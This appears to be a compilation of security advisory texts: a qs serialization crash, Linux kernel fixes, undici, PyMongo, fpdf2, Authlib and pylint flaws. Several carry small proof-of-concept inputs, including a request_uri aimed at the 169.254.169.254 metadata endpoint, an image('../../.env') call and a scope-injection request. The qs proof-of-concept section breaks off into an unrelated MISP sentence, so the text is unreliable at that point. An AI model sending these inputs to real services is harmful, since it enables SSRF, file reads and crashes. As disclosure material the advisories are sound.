2. **Control:** The attacker supplies data that becomes `{ a: [ { toString: <non-callable value> } ] }`, either via `a[0][toString]=x` parsed with `allowPrototypes`, or via a JSON body `{"a":[{"toString":"x"}]}`.
3. **Path:** In `stringify`, the primitive/buffer guard at `lib/stringify.js:134` is false for an array, so control reaches the comma branch at `lib/stringify.js:149`.
4. **Guard:** On the `encodeValuesOnly` path, the closure `v == null ? v : encoder(v)` at `lib/stringify.js:152-154` passes only `null`/`undefined` through; a non-null object still reaches the encoder. The default path skips that closure entirely and reaches `obj.join(',')` at `lib/stringify.js:156` with no guard at all.
5. **Primitive:** The element is coerced to a string (`Array.prototype.join`, or `String(str)` at `lib/utils.js:292`). `ToPrimitive` skips the non-callable own `toString`, `valueOf` returns the object, and a `TypeError` is thrown.
6. **Result:** The uncaught synchronous exception propagates out of the serialization call, failing the request and, in a service without a synchronous error boundary, crashing the process (denial of service).

## Bypass Evidence

This is a different element type on the code path CVE-2026-8723 (GHSA-q8mj-m7cp-5q26) patched, plus the default comma path, which that fix never covered. CVE-2026-8723 addressed a `TypeError` crash on `null`/`undefined` entries in the comma plus `encodeValuesOnly` path. Its fix (commit 21f80b3) wraps the encoder in `function (v) { return v == null ? v : encoder(v); }`, so it only passes `null` and `undefined` through. A non-null element with a hostile own `toString` fails the `v == null` test, so the encoder still runs and still throws; the encodeValuesOnly case (case C above) throws on the exact fixed code. The default comma path (`encodeValuesOnly` unset, the library default) never entered that fix at all: `git log -S "obj.join(','" -- lib/stringify.js` shows no security fix has ever touched the `obj.join(',')` line, and cases A and B throw with `encodeValuesOnly` unset. The related isBuffer hardening for CVE-2026-82417 (commit e83d321) is a different sink at the `lib/stringify.js:134` guard, which is never entered for the array element; the negative control `{a:{constructor:{isBuffer:'x'}}}` serializes cleanly. Disproof attempts that failed: a `valueOf`-only object does not throw (it serializes to `[object Object]`), confirming the trigger is an element with no callable `toString` (an own non-callable `toString`, or a null-prototype object with no `toString` at all, as `qs.parse` produces under `plainObjects`); nested arrays (`{"a":[[{"toString":"x"}]]}`) throw the same way; a callable `toString` serializes cleanly; and the default (non-comma) array format serializes cleanly, confirming the comma format is required. All positive and negative cases were reproduced on the exact published 6.16.0 artifact.

## Affected Versions

- `Ecosystem: npm`
- `Package: qs`
- `Confirmed affected range: >= 6.7.0, <= 6.16.0`
- `Latest release checked: 6.16.0 (npm latest; git tag v6.16.0)`
- `Fix status: fixed in 6.16.1 (a952e75)`

The `arrayFormat: 'comma'` join sink was introduced in qs 6.7.0, so 6.7.0 is the lower boundary; releases before 6.7.0 lack the sink. No released version fixes this vector, and the latest published release (6.16.0) reproduces the throw, so the closed upper bound `<= 6.16.0` covers every affected release. The `encodeValuesOnly` sub-path was added later, but the default comma-join vector already affects 6.7.0, so 6.7.0 governs the lower boundary.

## Suggested Fix

The comma array serialization must not allow an implicit string coercion of an array element to throw an uncaught exception. Coercion of each comma element should be performed defensively (for example by wrapping the join and per-element encode so that a coercion failure is caught and handled), and this protection must cover both the default `obj.join(',')` path and the `encodeValuesOnly` encoder path, not only the previously patched `null`/`undefined` case. As an interim mitigation without a code change, applications can avoid `arrayFormat: 'comma'` when serializing data derived from untrusted input, sanitize parsed objects (avoid `allowPrototypes`/`plainObjects` on untrusted input and strip unexpected own properties), or wrap `qs.stringify` calls in a synchronous error boundary so a coercion failure cannot crash the process.

Reported by zx (GitHub: @manus-pi).

---

## Independent report by @Lucidsec

The following was reported separately, after this advisory, and is merged here as a duplicate.

### Summary

In project [qs](https://github.com/ljharb/qs), in versions `>= 6.7.0, <= 6.16.0` (every version that supports `arrayFormat: 'comma'`), `qs.stringify` with `arrayFormat: 'comma'` can throw an uncaught `TypeError: Cannot convert object to primitive value` when an array element has a non-callable own `toString`. It is fixed in 6.16.1. Related: CWE-248 and CWE-704.

### Technical Details

`qs.stringify` with `arrayFormat: 'comma'` joins an array at `lib/stringify.js:156` via `obj.join(',')`. An element whose own `toString` is not callable makes `Array.prototype.join` throw. There is no type check and no catch on that path.

A second path exists with `encodeValuesOnly`: at `lib/stringify.js:151-154`, `maybeMap` only skips `v == null`, then `lib/utils.js:292` does `String(str)` and throws the same `TypeError` (this second site exists since v6.11.1; before that, the same input throws at `join`).

Who can trigger: someone who can shape an array element passed to `stringify`. The host must use non-default `arrayFormat: 'comma'`. Default `arrayFormat` `indices` does not fold arrays and is not affected. A parse-then-stringify path also needs `plainObjects: true` (null-prototype elements from `lib/parse.js:200`) or `allowPrototypes: true` (which Express 4's default query parser, Express 5's `extended` query parser, and body-parser's `extended` urlencoded parser all set). Default `qs.parse('a[0][toString]=x')` returns `{}` because the prototype guard drops `toString`. Direct JSON handed to `stringify` can supply `{"a":[{"toString":"x"}]}`.

Cause: the comma fold at `lib/stringify.js:149-156` collapses the array into a single value before the main loop at `lib/stringify.js:172-212`, so `skipNulls` and `strictNullHandling` only ever see the joined value, never individual elements. `isNonNullishPrimitive` / `isBuffer` at `lib/stringify.js:134` inspect the whole value, not each element. A normal object uses `Object.prototype.toString` and becomes `[object Object]`. An own non-callable `toString` is skipped, `valueOf` returns the object, and `join` throws. (The skipped TODO test at `test/stringify.js:684-689` uses a plain `{ b: 1 }` element, which does not throw; it covers the separate question of what comma format should output for object elements, not this crash.) Earlier comma crash fixes did not cover object elements.

### Impact

One small input makes that serialization path throw a synchronous, catchable `TypeError`. Behind a framework error boundary (eg, a synchronous Express handler), the request fails with a 500 and the process survives. In a host with no error boundary (eg, a bare `http.createServer` handler), the uncaught exception exits the process (the client sees `ECONNRESET`). Availability only.

### Proof of Concept

<details>
<summary>Show the proof of concept</summary>

Checked on the latest commit that was checked: `07b1d4d82c8f9301c105ea4b94fa2302cfd6e8b4`. Still present. Demonstrated.

- Payload `{"a":[{"toString":"x"}]}` throws at `lib/stringify.js:156`.

An attacker with the ability to author or modify MISP events in a feed source could include non-allowed taxonomy tags alongside allowed ones to exfiltrate more sensitive data to feed consumers than the guard policy intended to permit.

In the Linux kernel, the following vulnerability has been resolved:

i2c: davinci: fix division by zero on missing clock-frequency

When the 'clock-frequency' property is missing from the device tree,
the driver falls back to DAVINCI_I2C_DEFAULT_BUS_FREQ. However, this
macro was defined in kHz (100), whereas the device tree property is
expected in Hz.

The probe function divided the fallback value by 1000, causing
integer truncation that resulted in dev->bus_freq = 0. This triggered
a deterministic division-by-zero kernel panic when calculating clock
dividers later in the probe sequence.

Fix this by redefining DAVINCI_I2C_DEFAULT_BUS_FREQ in Hz (100000)
to match the expected device tree property unit, allowing the existing
division logic to work correctly for both cases.

items.summary:
In the Linux kernel, the following vulnerability has been resolved:

drm/cirrus-qemu: Validate BAR0 size during probe

The `cirrus-qemu` driver relies on `CIRRUS_VRAM_SIZE` (4 MB) to validate
framebuffer sizes. However, during PCI probe, the driver mapped BAR0
without verifying that its size matches `CIRRUS_VRAM_SIZE`.

If a PCI device with a BAR0 smaller than 4 MB is bound to the driver, the
mapped VRAM will be smaller than expected. Because validation checks assume
4 MB VRAM, framebuffers larger than the mapped memory can be created.

When the display plane is updated (e.g. during release),
`cirrus_primary_plane_helper_atomic_update()` copies the framebuffer to
VRAM using `drm_fb_memcpy()`. Writing past the end of the mapped I/O memory
causes a supervisor write page fault:

BUG: unable to handle page fault for address: ffffc9000389c000
...
RIP: 0010:memcpy_toio+0x7c/0xe0 arch/x86/lib/iomem.c:110
...
Call Trace:
 <TASK>
 iosys_map_memcpy_to include/linux/iosys-map.h:285 [inline]
 drm_fb_memcpy+0x325/0x5d0 drivers/gpu/drm/drm_format_helper.c:442
 cirrus_primary_plane_helper_atomic_update+0x98a/0xb00
 drivers/gpu/drm/tiny/cirrus-qemu.c:358
 drm_atomic_helper_commit_planes+0x626/0xea0
 drivers/gpu/drm/drm_atomic_helper.c:3038
 drm_atomic_helper_commit_tail+0x60/0x510
 drivers/gpu/drm/drm_atomic_helper.c:1989
 commit_tail+0x2b1/0x3c0 drivers/gpu/drm/drm_atomic_helper.c:2074
 drm_atomic_helper_commit+0xa77/0xb10
 drivers/gpu/drm/drm_atomic_helper.c:2312

Fix this by validating in `cirrus_pci_probe()` that the PCI BAR0 resource
is not less than `CIRRUS_VRAM_SIZE`, returning `-ENODEV` if it is less.

items.summary:
## Impact

undici's `decompress` interceptor forwards decompressed response data to the downstream handler from zlib stream event callbacks without catching exceptions those callbacks may throw. undici's engine converts a synchronous throw from a downstream handler into a per-request failure, but that protection is not in place when the throw happens asynchronously from a zlib callback. As a result, a downstream handler that throws by design, for example the built-in `dump` interceptor which throws when a response exceeds its `maxSize`, escapes as an uncaught exception and terminates the Node.js process.

A malicious or compromised HTTP server can crash any client that composes the `decompress` interceptor with `dump` (or another response handler that throws), by returning a small compressed body that decompresses to more than the configured limit. The compressed bytes on the wire are tiny, so only the decompressed size matters. If the application keeps the process alive with a global uncaught-exception handler, the affected request instead hangs until the body timeout.

## Patches

Upgrade to undici 7.30.1 or 8.12.2.

## Workarounds

Avoid composing the `decompress` interceptor with a response handler that throws during response processing (such as `dump` with a `maxSize`) until upgrading.

items.summary:
### Impact

undici's WebSocket client (including Node.js's bundled `globalThis.WebSocket`) can be driven to exhaust process memory by a malicious or compromised WebSocket server. For every PING frame received, the receiver automatically writes a PONG response to the socket and ignores the `false` return value from `socket.write()`, which is a backpressure signal, so a server that streams small PING frames while never reading the client's PONGs makes the outbound write queue and heap grow without bound until the Node.js process runs out of memory and terminates. The attack is remote and unauthenticated, needs only a normal WebSocket connection, and is asymmetric: small inbound PINGs produce a much larger retained outbound queue. Availability is the only impact. undici 5.x, 6.x, 7.x, and 8.x are affected; the WebSocket client was introduced in 5.15.0.

### Patches

Upgrade to `6.29.1`, `7.30.1`, or `8.12.2`, which pause WebSocket frame parsing when the automatic PONG response hits socket backpressure and resume on drain, bounding the outbound queue.

### Workarounds

None.

items.summary:
### Impact
The C extension's BSON decoder scans a Regex element's pattern and flags strings with strlen before checking the document's remaining length, so a crafted truncated Regex element can read past the end of the caller's buffer. bson.decode and bson.decode_all accept mmap and array buffers, which carry no NUL sentinel; the read can cross into unmapped memory and kill the process with an uncatchable SIGSEGV. Any application decoding untrusted BSON from such buffers is affected — impact is availability only, since the out-of-bounds bytes are never returned as content. NUL-terminated buffers (bytes, bytearray) raise `InvalidBSON` at worst; the driver's own transport and pure-Python installs are not affected. All releases through 4.18.2 are affected when the C extension is loaded.

### Patches
Fixed in PyMongo 4.18.3. Malformed Regex elements now raise InvalidBSON on every accepted buffer type; valid documents decode unchanged.

###  Workarounds
Decode untrusted BSON only from NUL-terminated buffers — bytes or bytearray — and copy mmap input first, e.g. bytes(mm[:size]).

items.summary:
There is a local confidentiality issue in the default `FileSessionManager` storage behavior. By default it writes session data under `/tmp/strands/sessions` and relies on the process umask for directory and file permissions. On systems using the common `umask 022`, the session directories are `0755` and JSON files are `0644`, so other local users can read persisted agent session data.

This matters on shared developer machines, CI hosts, notebooks, jump boxes, and multi-user GPU servers. Session storage is intended to persist conversation/history/state, so it can contain prompts, model output, tool inputs/outputs, intermediate state, and secrets that pass through the agent.

Relevant code:
- `strands-py/src/strands/session/file_session_manager.py:58`: default storage path is `os.path.join(tempfile.gettempdir(), "strands/sessions")`.
- `strands-py/src/strands/session/file_session_manager.py:118`: creates parent directories without a private mode.
- `strands-py/src/strands/session/file_session_manager.py:121`: writes JSON files via normal `open(..., "w")`.
- `strands-py/src/strands/session/file_session_manager.py:131`: creates session directories without a private mode.

Local reproduction with `umask 022`:

```text
default_storage_dir= /tmp/strands/sessions
0o755 /tmp/strands/sessions
0o755 /tmp/strands/sessions/session_codex_perm_poc
0o644 /tmp/strands/sessions/session_codex_perm_poc/session.json
file_contains_secret= True
```

The fixture wrote a fake secret into the session dict to show that sensitive session fields are readable through the resulting file.

Suggested fixes:
- Use a private per-user data directory by default rather than `/tmp`, or create `/tmp/strands` and descendants with `0700`.
- Write session JSON atomically with `0600` permissions.
- Consider refusing to use an existing default storage directory if it is not owned by the current user or is group/world accessible.
- Document that callers should set `storage_dir` explicitly when they need shared storage.

This was reproduced on commit `dd7b41de38cb`.

items.summary: WebSub is a W3C recommendation produced by the Social Web Working Group. In recommendation REC-websub-20180123, the intent-verification protocol requires a subscriber to echo the `hub.challenge` value, also exposed as `hub_challenge` by some frameworks, but does not require safe response media typing or disabled MIME sniffing. An attacker can initiate a subscription to obtain a callback URL and redirect a victim browser to a crafted verification request containing HTML or JavaScript. Subscribers that return the challenge as `text/html` can execute the reflected content in the subscriber origin, using a victim's existing session to read private data or perform actions, exposing `localStorage` or `sessionStorage` and browser permissions granted to that origin. An alternative uses the verification response as an attacker-controlled same-origin script resource to bypass `script-src 'self'`; this can remain possible with `application/octet-stream` when MIME sniffing is allowed. Safe media typing and `X-Content-Type-Options: nosniff` are both needed to address the described scenarios. WebSub Rocks demonstrated reflection, but the advisory does not establish practical impact on that demonstration site.

items.summary: ## Summary `fpdf2` implicitly dereferences image resource references supplied to rendering APIs. If an application passes untrusted HTML, SVG, template data, or image paths into those APIs, `fpdf2` may issue outbound HTTP(S) requests or attempt to open local filesystem paths. This behavior is relevant in applications that render untrusted or user-provided input without sanitizing or restricting embedded resource references. ## Description In affected versions, `fpdf2` uses a shared internal image-loading mechanism for multiple features. This loader: * fetches `http://` and `https://` URLs over the network * opens other string values as local filesystem paths During document processing, resource references embedded in input content are automatically dereferenced using this mechanism. This behavior is reachable through: * `FPDF.image()` * `FPDF.write_html()` via HTML `` * `FPDF.image()` when rendering SVG files containing `` or `xlink:href="...">` * template image elements that forward values into `FPDF.image()` If an application renders attacker-controlled input through these APIs, that input can cause: * outbound HTTP(S) requests to attacker-chosen destinations * local file open attempts for attacker-chosen paths This may enable Server-Side Request Forgery (SSRF) in applications that render untrusted content. Local file access impact is limited: the library attempts to open the referenced path, but successful embedding depends on the target being a valid and supported image or SVG resource. `file://` URLs are not specially handled; raw filesystem paths such as `/path/to/file` or `../../file.png` are the relevant local-path cases. ## Impact This issue affects applications that render untrusted or partially trusted content using `fpdf2`. Applications may be impacted if they: * pass untrusted HTML into `write_html()` * render untrusted SVG with embedded `` references * pass user-controlled strings into `image()` * allow untrusted template definitions or template field values to control image paths Potential impacts include: * outbound requests to internal or external network services * limited local file access attempts depending on file type and parsing success (limited to content that fpdf2 recognizes as a supported image or SVG resource) The severity depends on how `fpdf2` is integrated and whether untrusted input is allowed to control resource references. **Example scenarios** HTML: ```python pdf.write_html('') ``` SVG: ```xml ``` Direct image path: ```python pdf.image("../../.env") ``` **Workarounds** Applications can mitigate this by: - not rendering untrusted HTML, SVG, or template content - rejecting user-controlled `src` / `href` / image-path values - mapping resources through an application-defined allowlist - converting user-supplied images to trusted in-memory objects before passing them to `fpdf2` **Credits** - @kule500 for identifying SSRF via HTML handling - @BudongJW for identifying SVG resource loading as an additional vector - @redyank for analysis of the shared image loading mechanism - @manop55555 for identifying a DNS rebinding bypass in the initial REMOTE_PUBLIC implementation

items.summary:
### Summary

Authlib's RFC 9101 (JAR) extension passes the attacker-controlled `request_uri` authorization parameter straight to the `get_request_object()` fetch hook with no validation, at a pre-authentication endpoint. Authlib already defines the pre-registration allowlist for this (`request_uris` client metadata and `require_request_uri_registration` server metadata) but the extension never consults it, and both docstrings instruct integrators to implement the hook as an unrestricted `requests.get(request_uri)`. Deployments following the documented pattern get an unauthenticated SSRF primitive. 
### Details

Verified against authlib 1.7.2 and current `main`. All line numbers below are from `authlib/oauth2/rfc9101/authorization_server.py`.

The extension registers itself on the `before_get_authorization_grant` hook (lines 62-65), so it runs on every authorization request before any user or client authentication. `support_request_uri` defaults to `True` (line 58).

The only gate before the sink is that `client_id` names an existing client (lines 91-103). A `client_id` is a public, non-secret identifier.

The sink at line 159 forwards the raw parameter with no scheme, host, or allowlist check:

```python
def _get_raw_request_object(self, request: OAuth2Request) -> str:
    if "request_uri" in request.payload.data:
        raw_request_object = self.get_request_object(
            request.payload.data["request_uri"]
        )
        if not raw_request_object:
            raise InvalidRequestUriError(state=request.payload.state)
```

`get_request_object` is abstract (line 213, `raise NotImplementedError()` at line 225), so authlib itself performs no outbound request. The defect is that authlib supplies unvalidated attacker input to that extension point and then documents the insecure implementation twice — in the class docstring (lines 34-38) and in the hook's own docstring (lines 218-223):

```python
def get_request_object(self, request_uri: str):
    try:
        return requests.get(request_uri).text
    except requests.Exception:
        return None
```

Two points sharpen this beyond a generic documentation issue:

- **The allowlist already exists and is ignored.** Authlib validates `request_uris` as client metadata (`authlib/oauth2/rfc7591/claims.py:319`) and `require_request_uri_registration` as server metadata (`authlib/oauth2/rfc8414/models.py:263`). The `rfc9101` package contains zero references to either name, so the pre-registration model is never enforced at the point of use.
- **RFC 9101 §10.4.1 asks for controls that are absent.** It states the server should "a) check that the value of the `request_uri` parameter does not point to an unexpected location, b) check that the media type of the response is `application/oauth-authz-req+jwt`, c) implement a timeout for obtaining the content of `request_uri`, and d) not perform recursive GET on the `request_uri`." The extension implements none of these and the documented example implements none of them either.

The two failure paths are distinguishable, which supplies the inference channel for a blind SSRF: a falsy fetch result raises `InvalidRequestUriError` (`invalid_request_uri`, lines 162-163), while a successful fetch of non-JWT content raises `InvalidRequestObjectError` (`invalid_request_object`, line 186).

### PoC

This demonstrates the library-level defect with no network egress required: it shows the unvalidated URI reaching the fetch hook pre-authentication.

```bash
python -m venv .venv && .venv/bin/pip install authlib
```

```python
from authlib.oauth2.rfc6749.requests import BasicOAuth2Payload, OAuth2Request
from authlib.oauth2.rfc9101 import JWTAuthenticationRequest

reached = []


class Extension(JWTAuthenticationRequest):
    def get_request_object(self, request_uri):
        reached.append(request_uri)  # the docstring puts requests.get(request_uri) here
        return None

    def resolve_client_public_key(self, client):
        return {"keys": []}

    def get_server_metadata(self):
        return {}

    def get_client_require_signed_request_object(self, client):
        return False


class AuthorizationServer:
    def query_client(self, client_id):
        return object()


uri = "http://169.254.169.254/latest/meta-data/"
request = OAuth2Request("GET", "https://as.example/authorize")
request.payload = BasicOAuth2Payload({"client_id": "demo", "request_uri": uri})

try:
    Extension().parse_authorization_request(AuthorizationServer(), request)
except Exception as exc:
    print("error:", type(exc).__name__)

print("fetch hook received:", reached)
```

Output on authlib 1.7.2:

```text
error: InvalidRequestUriError
fetch hook received: ['http://169.254.169.254/latest/meta-data/']
```

Against a deployment that used the docstring implementation, the equivalent unauthenticated request is:

```text
GET /authorize?response_type=code&client_id=demo&request_uri=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F
```

Returning a fetched-but-non-JWT body instead of `None` in the snippet above yields `InvalidRequestObjectError` rather than `InvalidRequestUriError`, showing the oracle that distinguishes a reachable target from an unreachable one.

### Impact

Server-side request forgery, reachable without authentication by anyone who knows a valid `client_id`. In a deployment that implemented `get_request_object` as documented, an attacker can make the authorization server issue GET requests to arbitrary URLs: internal-only services, cloud metadata endpoints such as `169.254.169.254`, and side-effectful internal GET routes. The `invalid_request_uri` versus `invalid_request_object` split, together with response timing, provides an oracle for internal host and port discovery. RFC 9101 §10.4.1 additionally notes the DoS and recursive-lookup risks that the missing timeout and recursion checks leave open.

Response bodies are consumed as a JWT and never reflected, so this is a blind primitive rather than direct data exfiltration. Because the fetch executes in integrator code, deployments that already allowlist inside their override are unaffected — but authlib provides no hook to make that the default, ships `support_request_uri=True`, and its documentation steers integrators to the unsafe implementation, so the insecure outcome is the expected one.

items.summary:
### Impact

Since 2006 / pylint 0.15.2, pylint caches its stats as pickles in `PYLINT_HOME` and reload them on the next run with `pickle.load`. Someone without access to the configuration or linted code, but with access to the cache directory (predictable `PYLINT_HOME` on a multi-user host) can write a crafted pickle that will runs arbitrary code when pylint access its stat cache.

### Patches

From pylint 4.0.9, the result cache is now stored as JSON instead of pickle, preventing code-execution. 

### Workarounds

Until upgrading do not point `PYLINT_HOME` to an untrusted, shared, or group-writable directory. The default value, `~/.cache/pylint`, is writable only by the user running pylint.

### Credits

- Reported privately via Tidelift coordinated disclosure (Dan Lenz).

items.summary:
## Report metadata

| Field | Value |
| --- | --- |
| Package | `authlib` (PyPI, `pkg:pypi/authlib`) |
| Repository | https://github.com/authlib/authlib |
| Component | `authlib.oidc.core.grants.implicit.OpenIDImplicitGrant.validate_authorization_request` |
| Vulnerability class | Authorization bypass: a client's scope restriction is bypassed for OpenID Connect ID token issuance |
| Verified against | `c529a61af40e3efe05286140e00fbdced07d7987` (v1.8.0). Earlier releases were not checked. |
| API surface | Public API (`OpenIDImplicitGrant`, registered with `server.register_grant(...)`) |
| Affected in default configuration | Yes. No non-default option is needed once `OpenIDImplicitGrant` is registered. Client metadata decides exposure: Authlib's standard `ClientMixin` checks response type and scope independently, so a client can be permitted `id_token` responses without being allowed the `openid` scope. |

## Summary

`OpenIDImplicitGrant.validate_authorization_request()` first runs the parent `ImplicitGrant` validation, which filters the requested scope through `client.get_allowed_scope()` and stores the result in `request.scope`. It then decides whether this is an OpenID request by checking the raw, client-supplied `request.payload.scope` instead of that filtered value. A client that is allowed `profile` but not `openid` can therefore request `scope=openid profile`, pass the check, and receive a signed ID token (with `sub` and profile claims) once the user consents. This happens even when Authlib's built-in, scope-filtering `BearerTokenGenerator` is in use.

The tainted input is the authorization request's `scope` parameter. The OAuth client fully controls it, and the client is the very party the scope restriction is meant to constrain. Any registered client can add `openid` to its request if it is permitted an `id_token` or `id_token token` response type and its allowed scopes exclude `openid` but include a claim-bearing scope such as `profile`.

Sibling paths treat the same client correctly, which suggests the raw-scope check is a bug rather than intended behaviour:

- `ImplicitGrant.validate_authorization_request()` -> filters the requested scope through `client.get_allowed_scope()` into `request.scope` (safe, [`authlib/oauth2/rfc6749/grants/implicit.py` lines 141-147](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/oauth2/rfc6749/grants/implicit.py#L141-L147))
- `OpenIDImplicitGrant.validate_authorization_request()` -> **checks the raw `request.payload.scope` (unsafe, [`authlib/oidc/core/grants/implicit.py` line 72](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/oidc/core/grants/implicit.py#L72))**
- `UserInfoEndpoint` -> rejects the same client's access token with 403 `insufficient_scope` (safe; observed during verification, line not recorded)
- OIDC authorization code flow -> issues no `id_token` for the same client (safe; observed during verification, line not recorded)

## Impact

A registered OAuth client that the operator has excluded from the `openid` scope can get an OpenID Connect ID token for any user who logs in and approves its authorization request. During verification the provider returned an RS256-signed ID token carrying `iss`, `aud` (the requesting client), `nonce`, `auth_time`, `at_hash`, `sub` and `name`, while the granted scope was only `profile`. A consent page built the way the Authlib docs show lists only `profile`, so the user is not shown that an identity token will be issued.

Without this bug, the same request fails with `InvalidScopeError` ("Missing 'openid' scope") because the client's resolved scope does not include `openid`. The new capability is the ID token itself: a signed assertion of the user's identity (`sub`) plus claims from the client's other allowed scopes. Gating that token is exactly what the `openid` scope is for. The access token stays restricted when the built-in token generator is used: Authlib's `UserInfoEndpoint` rejects it with 403 `insufficient_scope`.

**Scoring note:** we did not compute a CVSS score. An initial triage rated this High. After dynamic verification we assess practical severity as closer to Medium, because:

1. The attacker must be a registered client that is permitted `id_token` response types.
2. The user must log in and consent.
3. The ID token's `aud` is the attacking client.

Two kinds of deployment are not affected:

- Deployments that use only the OIDC authorization code flow. During verification, that flow issued no ID token for the same client.
- Deployments where every client permitted an `id_token` or `id_token token` response type is also allowed the `openid` scope.

## Preconditions

1. The authorization server registers `OpenIDImplicitGrant` (or a subclass), e.g. `server.register_grant(MyOpenIDImplicitGrant)`. The vulnerable method runs on every OIDC implicit authorization request.
2. A client's metadata permits an OIDC implicit response type (`id_token` or `id_token token`). Nothing in Authlib ties this to the `openid` scope. The standard SQLAlchemy `ClientMixin` checks response type and scope independently, and it filters requested scopes against the client's allowed scopes at [`authlib/integrations/sqla_oauth2/client_mixin.py:124-129`](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/integrations/sqla_oauth2/client_mixin.py#L124-L129).
3. That client's allowed scopes exclude `openid` but include another claim-bearing scope, such as `profile`.
4. The attacker controls that registered client and sends an authorization request that adds `openid` to otherwise allowed scopes (e.g. `scope=openid profile`), with a `nonce`.
5. A user logs in and approves the request.
6. Branch condition: the raw `request.payload.scope` contains `openid` while the filtered `request.scope` does not. So `is_openid_scope(self.request.payload.scope)` is true at `implicit.py:72` and no `InvalidScopeError` is raised.

No non-standard usage, monkey-patching or unusual configuration is needed: this is the public grant used as intended. Keeping a client's response types and allowed scopes in sync is not documented as the integrator's responsibility. The parent grant stores the filtered `request.scope` specifically so that authorization decisions use it. We did not capture a link to the relevant Authlib docs page, but the verification built its consent page the way those docs show.

## Data flow

1. **Source**: the OAuth client controls the authorization request's `scope` parameter, e.g. `GET /authorize?response_type=id_token%20token&client_id=c&redirect_uri=https%3A%2F%2Fc%2Fcb&scope=openid%20profile&nonce=n`. The raw value remains available as `request.payload.scope`.
2. **Propagation**: `ImplicitGrant.validate_authorization_request()` filters the requested scope through `client.get_allowed_scope()` and stores the result in `request.scope` (here `'profile'`). `request.payload.scope` still holds the raw `openid profile` ([`authlib/oauth2/rfc6749/grants/implicit.py:141-147`](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/oauth2/rfc6749/grants/implicit.py#L141-L147)).
3. **Sink**: `OpenIDImplicitGrant.validate_authorization_request()` uses the raw value to decide whether this is an OpenID request: `if not is_openid_scope(self.request.payload.scope):` ([`authlib/oidc/core/grants/implicit.py:72`](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/oidc/core/grants/implicit.py#L72)). The injected `openid` satisfies the check, so the method returns the redirect URI instead of raising `InvalidScopeError` ([`authlib/oidc/core/grants/implicit.py:70-84`](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/oidc/core/grants/implicit.py#L70-L84)).
4. **Reachability**: `OpenIDImplicitGrant` is the public grant that serves OIDC implicit authorization requests. After the user consents, `create_granted_params()` and `process_implicit_token()` issue the ID token and user claims ([`authlib/oidc/core/grants/implicit.py:112-129`](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/oidc/core/grants/implicit.py#L112-L129), [`authlib/oidc/core/grants/implicit.py:132-169`](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/oidc/core/grants/implicit.py#L132-L169)).

## Vulnerable code

`authlib/oidc/core/grants/implicit.py`, lines 70-84 at `c529a61af40e3efe05286140e00fbdced07d7987` (an excerpt; `...` marks code left out of the captured snippet):

```python
redirect_uri = super().validate_authorization_request()  # safe: parent grant sets the filtered request.scope
if not is_openid_scope(self.request.payload.scope):  # <-- sink (line 72): raw, client-supplied scope
    raise InvalidScopeError("Missing 'openid' scope", ...)
...
return redirect_uri
```

## Reproduction

Verified two ways on Authlib `c529a61af40e3efe05286140e00fbdced07d7987` (v1.8.0):

- a pytest PoC using the Flask test client
- a standalone Flask OpenID Provider on localhost, driven with `curl`

The Python and Flask versions were not recorded.

Setup: a client registered with `scope='profile'` only (no `openid`) and response types `id_token` / `id_token token`. It uses Authlib's built-in SQLAlchemy `ClientMixin` and the built-in scope-filtering `BearerTokenGenerator`.

1. The client sends an authorization request with `scope=openid profile` and a `nonce`.
2. `ImplicitGrant` sets `request.scope='profile'`. A consent page built the way the docs show displays only `profile`.
3. `OpenIDImplicitGrant.validate_authorization_request()` checks the raw `request.payload.scope` at line 72, so the request passes.
4. After the user approves, the provider returns an RS256-signed ID token with `iss`, `aud` (the client), `nonce`, `auth_time`, `at_hash`, `sub` and `name`, while the granted scope is `profile`. The ID token's signature verified against the provider's JWKS.

Controls run during verification:

- The same request without `openid` returns `invalid_scope` ("Missing 'openid' scope").
- Authlib's `UserInfoEndpoint` rejects this client's access token with 403 `insufficient_scope`.
- The OIDC authorization code flow for the same client issues no `id_token`.

The sketch below shows the request shape against Authlib's Flask OIDC test app. The verification's own test script is not included here.

```python
# Client metadata: scope='profile' (no openid), response_types=['id_token token'].
rv = client.get('/authorize?response_type=id_token%20token&client_id=client-id&redirect_uri=https%3A%2F%2Fclient.test%2Fauthorized&scope=openid%20profile&nonce=n')
# after the user grants consent:
assert 'id_token=' in rv.headers['Location']  # should have been rejected: openid is not an allowed scope
```

- **Expected:** `InvalidScopeError` / `invalid_scope` ("Missing 'openid' scope"), because the client's resolved allowed scope (`request.scope == 'profile'`) does not include `openid`.
- **Actual:** after consent, the redirect carries a signed ID token (including `sub` and `name`) while the granted scope is `profile`.

## Suggested remediation

Decide whether to issue OpenID tokens from the scope the grant actually authorized, never from the raw requested scope. The authorized scope is `self.request.scope`, which the parent grant has already filtered through `client.get_allowed_scope()`.

```diff
 redirect_uri = super().validate_authorization_request()
-if not is_openid_scope(self.request.payload.scope):
+if not is_openid_scope(self.request.scope):
     raise InvalidScopeError("Missing 'openid' scope", ...)
```

During verification, this one-line change at line 72 blocked the exploit, and the existing OIDC implicit/hybrid tests still passed (23 passed).

The same rule should hold for the rest of OIDC issuance. `create_granted_params()` ([`authlib/oidc/core/grants/implicit.py:112-129`](https://github.com/authlib/authlib/blob/c529a61af40e3efe05286140e00fbdced07d7987/authlib/oidc/core/grants/implicit.py#L112-L129)) passes the raw `payload.scope` to `generate_token`. It should pass `self.request.scope` instead.

Notes:

- **Adjacent raw-scope use, worth fixing in the same change:** `create_granted_params()` hands the raw `payload.scope` to `generate_token`. So a deployment whose custom token generator does not filter scope also grants the client access-token scopes it is not allowed; verification noted `openid` and `email`. Authlib's built-in `BearerTokenGenerator` re-filters the access-token scope, so this only shows up with a non-filtering generator. That re-filtering does not stop the ID token.
